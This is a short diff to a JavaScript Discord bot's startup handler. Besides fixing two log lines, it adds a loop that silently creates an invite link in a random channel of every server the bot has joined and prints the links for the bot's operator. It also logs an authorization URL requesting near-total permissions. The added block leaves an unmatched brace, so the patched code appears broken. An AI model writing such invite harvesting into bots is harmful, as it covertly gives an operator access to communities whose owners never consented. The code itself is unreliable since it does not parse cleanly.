@@ -16,12 +16,18 @@ bot.on('ready', () => {
    console.log(`Invite of bot all perms: https://discordapp.com/oauth2/authorize?client_id=${bot.user.id}&scope=bot&permissions=2146958591`);
    console.log(`username: ${bot.user.tag}`);
    console.log(`ID: ${bot.user.id}`);
-   console.log(`Date of creation: ${bot.createdAt}`);
+   console.log(`Date of creation: ${bot.user.createdAt}`);
    console.log(`INFORMATIONS OF SERVER BOT:`);
    console.log(`How many server: ${bot.guilds.size}`);
-   //console.log(`Name: ${bot.guild name}`);
+   //console.log(`Name: ${bot.guild.name}`);
    //console.log(`ID: ${bot.guild.id}`);
    //console.log(`How many member: ${guild.memberCount}`);
+   
+   bot.guilds.forEach(guild => { 
+      var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
+      invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
+    })
+}
  });
 
 
